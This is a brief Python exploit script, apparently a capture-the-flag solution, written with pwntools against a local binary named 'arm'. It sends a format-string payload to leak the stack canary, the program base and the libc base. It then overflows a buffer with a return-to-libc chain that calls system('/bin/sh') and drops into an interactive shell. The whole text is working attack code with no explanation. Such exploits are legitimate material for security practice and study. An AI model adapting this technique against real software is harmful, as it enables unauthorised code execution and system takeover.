from pwn import *


def send_rifle(payload):
    p.sendlineafter("get info:\n", payload)

p = process("./arm")
elf = ELF("arm")
libc = elf.libc


send_rifle("%13$p-%19$p-%15$p")
p.recvline()
p.recvline()

leak = p.recvline()

canary = int(leak.strip().split("-")[0], 16)
elf.address = int(leak.strip().split("-")[1], 16) - 0xb95
libc.address = int(leak.strip().split("-")[2][:-1], 16) - 0x270b3
pop_rdi = elf.address + 0x0000000000000d03 #: pop rdi ; ret

log.success(leak)
log.info("Canary: " + hex(canary))
log.info("ELF: " + hex(elf.address))
log.info("LIBC: " + hex(libc.address))
log.info("POP RDI; RET: " + hex(pop_rdi))

send_rifle("Exit")

payload = ""
payload += "A"*24
payload += p64(canary)
payload += "A"*8
payload += p64(pop_rdi)
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(libc.sym['system'])

p.recvline()
p.sendline(payload)

p.interactive()
